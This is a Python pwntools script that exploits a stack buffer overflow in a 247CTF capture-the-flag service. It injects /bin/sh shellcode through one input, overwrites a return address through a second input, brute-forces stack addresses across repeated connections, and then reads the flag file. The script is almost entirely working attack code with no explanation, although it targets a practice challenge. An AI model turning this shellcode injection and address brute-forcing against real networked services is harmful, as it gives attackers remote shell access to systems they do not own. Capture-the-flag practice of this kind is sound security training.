#!/usr/bin/env python3
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'error'

HOST = 'f7a5ee299a54c9f1.247ctf.com'
PORT = 50430

shellcode = asm(shellcraft.sh())
first_input = shellcode.ljust(50, b'\x90')

# Try a wide range of stack addresses
# Stack could be anywhere in upper memory
for high_byte in range(0xff, 0xf0, -1):
    for offset in range(0xe000, 0xf000, 0x10):
        addr = (high_byte << 24) | offset
        
        if addr % 0x100 == 0:
            print(f"[*] Progress: 0x{addr:08x}")
            sys.stdout.flush()
        
        try:
            p = remote(HOST, PORT, level='error')
            p.recvuntil(b"first name?\n", timeout=0.5)
            p.send(first_input)
            
            p.recvuntil(b"surname?\n", timeout=0.5)
            
            second_input = b'A' * 23 + p32(addr)
            p.send(second_input)
            
            time.sleep(0.15)
            p.sendline(b'cat /flag* 2>/dev/null;echo X')
            
            result = p.recvall(timeout=0.2)
            if b'247CTF{' in result or b'flag{' in result:
                print(f"\n\n[+] FLAG FOUND with addr 0x{addr:08x}!")
                print(result.decode('latin1', errors='ignore'))
                with open('/tmp/FLAG', 'wb') as f:
                    f.write(result)
                sys.exit(0)
                
            p.close()
        except:
            pass

print("[*] Phase complete")
